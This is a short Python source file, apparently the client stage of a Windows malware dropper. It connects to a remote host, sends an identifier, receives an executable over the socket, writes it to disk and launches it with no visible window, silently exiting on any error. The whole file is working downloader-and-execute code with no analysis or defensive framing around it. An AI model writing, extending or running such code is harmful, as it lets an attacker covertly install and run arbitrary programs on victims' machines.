# -*- coding:utf-8 -*-
# @FileName  :basic_conn.py
# @Time      :2022/11/24 20:37:43
# @Author    :D0WE1L1N
import socket
from os import remove
from os.path import isfile
from sys import exit
from win32process import CreateProcess, CREATE_NO_WINDOW, STARTUPINFO
def collect_payload(s):
    len_data = s.recv(1024).decode('utf8')
    s.send(bytes("OK", "UTF8"))
    upload_data = s.recv(int(len_data))
    if isfile(f'{_id}.exe'):
        remove(f'{_id}.exe')
    f = open(f"{_id}.exe", "wb+")
    f.write(upload_data)
    f.close()
    s.close()
    CreateProcess(f"{_id}.exe", '', None, None, 0, CREATE_NO_WINDOW, None, None, STARTUPINFO())
    exit(0)
def _connect(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.recv(1024)
        s.send(bytes('basic_conn', 'utf8'))
        s.recv(1024)
        s.send(bytes(str(len(_id)), 'utf8'))
        s.recv(1024)
        s.send(bytes(_id, 'utf8'))
        is_make = s.recv(1024)
        if is_make == b'OK':
            collect_payload(s)
        elif is_make == b'wait':
            s.recv(1024)
            collect_payload(s)
        else:
            exit(0)
    except:
        exit(0)

